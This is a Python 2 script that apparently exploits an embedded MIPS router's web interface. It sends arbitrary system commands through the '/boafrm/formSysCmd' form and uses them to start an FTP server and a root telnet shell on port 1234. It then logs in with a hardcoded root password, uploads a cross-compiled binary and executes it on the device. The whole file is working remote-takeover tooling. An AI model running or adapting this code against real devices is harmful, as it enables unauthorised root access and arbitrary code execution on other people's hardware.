from ftplib import FTP
import telnetlib
import sys
import os
import requests
from bs4 import BeautifulSoup
#from solveenc import *

#SolveEncodingProblem()

def SendCommand(ip, cmd):
   datas = {'apply':'Apply', 'msg':'', 'submit-url':'/syscmd.htm', 'sysCmd':cmd}
   r = requests.post("http://%s/boafrm/formSysCmd" % ip,data=datas)  
   soup = BeautifulSoup(r.text,'lxml')
   data = soup.find('textarea')
   #print data.text
   return data.text.encode('utf-8','ignore')

#print SendCommand(sys.argv[1], "cd /bin; ls -al")
#SendCommand(sys.argv[1], "cd /bin; pure-ftpd &") # root:swetop
#SendCommand(sys.argv[1], "telnetd -l/bin/ash -p %d" % int(sys.argv[2]))

def ftpfile(ip, filename):
   ftp = FTP(ip)
   ftp.login('root', 'swetop')
   ftp.cwd('/tmp')
   ftp.storbinary('STOR '+filename, open(filename, 'rb'))
   ftp.quit()

def telnetexefile(ip, port, filename, arg):
   tn = telnetlib.Telnet(ip, port)
   tn.read_until('#')
   tn.write("cd /tmp\n")
   tn.read_until('#')
   #tn.write("pwd\n")
   #print tn.read_until('#')
   tn.write("chmod +x ./%s\n" % filename)
   tn.read_until('#')
   tn.write("./%s %s\nexit\n" % (filename, arg))
   content = tn.read_all()
   tn.close()
   return content

def compilefile(filename):
   os.system("../cross-compiler-mips/bin/mips-gcc %s.c -static -o %s > compile.txt 2>&1" % (filename, filename))

def showdellog():
   os.system("cat compile.txt")
   os.system("rm compile.txt")

ip = sys.argv[1]
filename = sys.argv[2]
arg = ' '.join(sys.argv[3:])

print "[o] compiling file ...",
compilefile(filename)
print "Done."

showdellog()

print "[o] uploading file ...",   
try:
   ftpfile(ip, filename)
except:
   SendCommand(sys.argv[1], "cd /bin; pure-ftpd &") # root:swetop
   ftpfile(ip, filename)
print "Done."

print "[o] execute file ...",
try:
   content = telnetexefile(ip, 1234, filename, arg)
except:
   SendCommand(ip, "telnetd -l/bin/ash -p 1234")
   content = telnetexefile(ip, 1234, filename, arg)
print "Done."

print content
